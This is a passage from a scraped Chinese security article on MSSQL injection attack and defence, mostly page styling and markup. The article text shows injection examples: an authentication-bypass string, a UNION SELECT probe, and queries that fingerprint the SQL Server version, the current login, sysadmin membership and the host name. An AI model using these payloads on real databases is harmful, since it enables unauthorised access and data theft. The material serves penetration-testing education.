<html>
<head>
<title>干货MSSQL注入攻击与防御</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
干货 | MSSQL 注入攻击与防御
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                                                                <span class="rich_media_meta rich_media_meta_text">
                                                                    rootclay
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2018-12-10</em>
                </div>

                
                                                <div id="js_tags"  class="article-tag__list" style="display: none;" data-len="0">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                    </div>
                                    </div><div id="weixin_content"><p data-mpa-powered-by="yiban.io"><img class="" data-ratio="0.525" src="图片/HACK学习呀_2018-12-10_干货MSSQL注入攻击与防御/1_gnDkKpWPiaA5FYjFLwUxUialfOCZ1g.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibOskrUKLMf9zJEoniaQ99DeicEfTQqsbYJSUVRibAfiaBFTx7PH2gnDkKpWPiaA5FYjFLwUxUialfOCZ1g/640?wx_fmt=jpeg'" data-type="jpeg" data-w="640" style="font-size:14px;line-height:34px;;font-weight: bolder;background-color: rgb(255, 255, 255);color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;text-align: center;text-indent: 0em;vertical-align: middle;border-style: none;display: block;margin-top: 12px;margin-bottom: 12px;top: auto;left: auto;right: auto;bottom: auto;" title="t014bd736a73a94c097.jpg"  /></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">前言</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">本文所用数据库涉及SQL Server 2k5,2k8,2k12,其次对于绕过姿势和前文并无太大差别,就不做过多的讲解,主要放在后面的提权上</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">系统库</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;text-indent: 0em;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><span style="color: rgb(29, 173, 167);background-color: transparent;top: auto;left: auto;margin: 12px 0px;right: auto;bottom: auto;font-size:14px;line-height:34px;;text-decoration: underline;"><img class="" data-ratio="0.5204968944099378" src="图片/HACK学习呀_2018-12-10_干货MSSQL注入攻击与防御/2_riciaY2I8bW5MXKicOREY8lvMLQGUA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibOskrUKLMf9zJEoniaQ99DeKKNF7HWibado433I0gMfma56YX4vriciaY2I8bW5MXKicOREY8lvMLQGUA/640?wx_fmt=png'" data-type="png" data-w="805" style="vertical-align: middle;border-style: none;display: block;margin: 0px;" title="t01287a065f9c9a0374.png"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">注释</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;text-indent: 0em;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><span style="top: auto;left: auto;margin: 12px 0px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="" data-ratio="0.19627329192546583" src="图片/HACK学习呀_2018-12-10_干货MSSQL注入攻击与防御/3_zibUBSFQnpekKMRm63fEVic08WuqTw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibOskrUKLMf9zJEoniaQ99DeOFOduadRafIa9N9e4h84tkjylHzibUBSFQnpekKMRm63fEVic08WuqTw/640?wx_fmt=png'" data-type="png" data-w="805" style="vertical-align: middle;border-style: none;display: block;margin: 0px;" title="t0173327fa0454df760.png"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">实例：</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs sql" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">SELECT</span>&nbsp;*&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">FROM</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">Users</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">WHERE</span>&nbsp;username&nbsp;=&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">''</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">OR</span>&nbsp;<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">1</span>=<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">1</span>&nbsp;<span class="hljs-comment" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 136);font-style: italic;">--'&nbsp;AND&nbsp;password&nbsp;=&nbsp;'';</span><span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">SELECT</span>&nbsp;*&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">FROM</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">Users</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">WHERE</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">id</span>&nbsp;=&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">''</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">UNION</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">SELECT</span>&nbsp;<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">1</span>,&nbsp;<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">2</span>,&nbsp;<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">3</span><span class="hljs-comment" style="font-size:14px;line-height:34px;;color: rgb(153, 153, 136);font-style: italic;">/*';</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;font-weight: bolder;">版本&amp;数据库当前用户&amp;主机名</span><br  /></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">版本</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs nginx" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-attribute" style="font-size:14px;line-height:34px;;color: rgb(0, 0, 128);">select</span>&nbsp;@<span class="hljs-variable" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">@VERSION</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">如果是2012的数据库返回为True</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs sql" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">SELECT</span>&nbsp;*&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">FROM</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">Users</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">WHERE</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">id</span>&nbsp;=&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'1'</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">AND</span>&nbsp;@@<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">VERSION</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">LIKE</span>&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'%2012%'</span>;</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">数据库当前用户</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><span style="color: rgb(29, 173, 167);background-color: transparent;top: auto;left: auto;margin: 12px 279.2px;right: auto;bottom: auto;font-size:14px;line-height:34px;;text-decoration: underline;"><img class="" data-ratio="0.1937888198757764" src="图片/HACK学习呀_2018-12-10_干货MSSQL注入攻击与防御/4_nxfyCIf9dtdWT6YUrTticLGp7YTenQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibOskrUKLMf9zJEoniaQ99DeUyQK38LzNUdKiaPdjZlOicDsn0pnxfyCIf9dtdWT6YUrTticLGp7YTenQ/640?wx_fmt=png'" data-type="png" data-w="805" style="vertical-align: middle;border-style: none;display: block;margin: 0px;" title="t012a9cd24d1a08d004.png"  /></span><span style="font-size:14px;line-height:34px;;font-weight: bolder;">实例：</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs sql" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">Return&nbsp;current&nbsp;user:<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">SELECT</span>&nbsp;loginame&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">FROM</span>&nbsp;master..sysprocesses&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">WHERE</span>&nbsp;spid=@@SPID;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">Check</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">if</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">user</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">is</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">admin</span>:<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">SELECT</span>&nbsp;(<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">CASE</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">WHEN</span>&nbsp;(IS_SRVROLEMEMBER(<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'sysadmin'</span>)=<span class="hljs-number" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">1</span>)&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">THEN</span>&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'1'</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">ELSE</span>&nbsp;<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">'0'</span>&nbsp;<span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">END</span>);</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">主机名</span></p><pre style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs nginx" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-attribute" style="font-size:14px;line-height:34px;;color: rgb(0, 0, 128);">select</span>&nbsp;@<span class="hljs-variable" style="font-size:14px;line-height:34px;;color: rgb(0, 128, 128);">@SERVERNAME</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;font-weight: bolder;">库&amp;表&amp;列</span><br  /></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-weight: bolder;font-size:14px;line-height:34px;;">库名</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft 